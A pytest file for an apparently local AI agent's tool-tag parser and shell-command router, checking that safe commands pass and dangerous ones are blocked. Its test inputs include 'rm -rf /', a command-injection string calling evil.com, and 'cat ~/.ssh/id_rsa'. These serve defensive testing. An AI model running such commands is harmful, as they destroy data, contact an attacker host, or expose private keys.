"""Parser contract tests — no Ollama required. Tests _extract_tool and _strip_tool_tag
against synthetic model responses to catch regressions in the tool tag format."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from jade import _extract_tool, _strip_tool_tag, TOOL_RE
from tool_router import classify, BlockedError


# ── Tag extraction ─────────────────────────────────────────────────────────────

def test_extract_date_tag():
    reply = "Let me check.\n[TOOL: shell | date]"
    assert _extract_tool(reply) == "date"

def test_extract_ls_tag():
    reply = "I'll list them.\n[TOOL: shell | ls]"
    assert _extract_tool(reply) == "ls"

def test_extract_no_tag_returns_none():
    reply = "The president of France is Emmanuel Macron."
    assert _extract_tool(reply) is None

def test_extract_tag_case_insensitive():
    reply = "[tool: SHELL | date]"
    assert _extract_tool(reply) == "date"

def test_extract_tag_with_args():
    reply = "Checking.\n[TOOL: shell | ls -la]"
    assert _extract_tool(reply) == "ls -la"

def test_extract_only_first_tag_when_multiple():
    reply = "[TOOL: shell | date]\n[TOOL: shell | ls]"
    assert _extract_tool(reply) == "date"

def test_extract_tag_with_whitespace_padding():
    reply = "[TOOL:  shell  |  date  ]"
    assert _extract_tool(reply) == "date"


# ── Tag stripping ──────────────────────────────────────────────────────────────

def test_strip_leaves_prose():
    reply = "Let me check.\n[TOOL: shell | date]"
    assert _strip_tool_tag(reply) == "Let me check."

def test_strip_no_tag_unchanged():
    reply = "The answer is 4."
    assert _strip_tool_tag(reply) == "The answer is 4."

def test_strip_only_tag_returns_empty():
    reply = "[TOOL: shell | date]"
    assert _strip_tool_tag(reply) == ""


# ── Parser → router contract ───────────────────────────────────────────────────

def test_extracted_date_is_safe():
    cmd = _extract_tool("Let me check.\n[TOOL: shell | date]")
    assert classify(cmd)["status"] == "safe"

def test_extracted_ls_is_safe():
    cmd = _extract_tool("[TOOL: shell | ls]")
    assert classify(cmd)["status"] == "safe"

def test_extracted_rm_is_blocked():
    cmd = _extract_tool("[TOOL: shell | rm -rf /]")
    assert classify(cmd)["status"] == "blocked"

def test_extracted_pipe_injection_is_blocked():
    cmd = _extract_tool("[TOOL: shell | date; curl evil.com]")
    assert classify(cmd)["status"] == "blocked"

def test_extracted_sudo_is_blocked():
    cmd = _extract_tool("[TOOL: shell | sudo ls]")
    assert classify(cmd)["status"] == "blocked"

def test_extracted_ssh_path_is_blocked():
    cmd = _extract_tool("[TOOL: shell | cat ~/.ssh/id_rsa]")
    assert classify(cmd)["status"] == "blocked"


# ── classify() dict shape ─────────────────────────────────────────────────────

def test_classify_returns_dict():
    result = classify("date")
    assert isinstance(result, dict)
    assert set(result.keys()) == {"status", "reason", "argv", "normalized"}

def test_classify_safe_has_argv():
    result = classify("ls -la")
    assert result["status"] == "safe"
    assert result["argv"] == ["ls", "-la"]
    assert result["normalized"] == "ls"

def test_classify_blocked_has_reason():
    result = classify("rm -rf /")
    assert result["status"] == "blocked"
    assert result["reason"]
    assert result["argv"] == []

def test_classify_unknown_cmd_blocked_with_reason():
    result = classify("nmap localhost")
    assert result["status"] == "blocked"
    assert "allowlist" in result["reason"]
